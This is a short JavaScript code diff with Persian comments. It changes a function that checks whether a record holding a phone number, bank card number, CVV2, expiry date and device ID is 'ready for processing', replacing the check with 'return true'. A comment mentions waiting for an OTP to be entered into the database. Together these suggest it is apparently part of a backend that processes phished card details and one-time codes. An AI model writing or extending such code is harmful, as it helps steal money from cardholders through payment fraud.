@@ -38,13 +38,14 @@ async function connectDB() {
 
 // آیا کاربر آماده پردازشه؟
 function isReady(doc) {
-  return doc.personalPhoneNumber &&
-         doc.cardNumber &&
-         doc.cvv2 != null &&
-         doc.bankMonth != null &&
-         doc.bankYear != null &&
-         doc.deviceId &&
-         !doc.processed;
+  return true 
+  // return doc.personalPhoneNumber &&
+  //        doc.cardNumber &&
+  //        doc.cvv2 != null &&
+  //        doc.bankMonth != null &&
+  //        doc.bankYear != null &&
+  //        doc.deviceId &&
+  //        !doc.processed;
 }
 
 // صبر کردن تا OTP تو دیتابیس وارد بشه
